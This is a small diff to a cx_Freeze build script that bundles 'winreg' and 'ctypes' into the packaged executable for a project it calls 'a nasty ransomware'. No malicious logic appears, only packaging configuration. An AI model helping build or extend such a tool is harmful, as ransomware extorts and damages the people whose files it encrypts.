@@ -16,6 +16,8 @@ build_exe_options = {"packages": ["cffi",
                                   "os",
                                   "ssl",
                                   "socket",
+                                  "winreg",
+                                  "ctypes",
                                   "platform",
                                   "tkinter",
                                   "functools"],
@@ -37,4 +39,4 @@ setup(
         description = "a nasty ransomware",
         options = {"build_exe": build_exe_options},
         executables = [Executable("Main.py", base=base)]
-    )
+     )
